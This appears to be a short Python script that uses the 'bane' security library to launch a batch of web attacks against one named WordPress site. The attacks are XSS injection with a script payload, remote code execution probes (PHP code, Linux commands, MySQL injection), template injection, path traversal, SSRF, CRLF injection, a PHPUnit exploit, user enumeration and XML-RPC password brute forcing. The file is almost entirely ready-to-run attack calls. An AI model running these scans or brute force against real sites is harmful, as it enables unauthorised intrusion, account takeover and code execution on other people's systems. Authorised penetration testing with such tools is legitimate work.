import bane
link = 'http://wordpress.senthu.io/wp-login.php'
bane.xss_forms('wordpress.senthu.io' , payload="<script>alert(123)</script>" , timeout=15 )
bane.rce_forms(link ,injection={"code":"php"},based_on='file', timeout=15 )
bane.xss_forms(link , payload="<script>alert(123)</script>" , timeout=15 )
bane.ssti_forms(link  , timeout=15 )
bane.rce_forms(link ,injection={"command":"linux"},based_on='time', timeout=15 )
bane.rce_forms(link ,injection={"code":"php"},based_on='time', timeout=15 )
bane.rce_forms(link ,injection={"sql":"mysql"}, timeout=15 )#test for MySQL
bane.path_traversal_urls(link, timeout=15 )
bane.ssrf_urls(link )
bane.crlf_header_injection(link, timeout=15 )
bane.crlf_body_injection(link, timeout=15 )
bane.clickjacking(link, timeout=15 )
bane.hsts(link, timeout=15 )
bane.cors_misconfigurations(link, timeout=15 )
#bane.exposed_env(link , timeout=15 )
bane.phpunit_exploit(link , timeout=15 )

link = 'http://wordpress.senthu.io'
bane.wp_users(link , timeout=15 )
    
bane.wp_xmlrpc_methods(link , timeout=15 )
bane.wp_xmlrpc_bruteforce(link , timeout=15 )
#bane.wp_scan(link , timeout=15 )
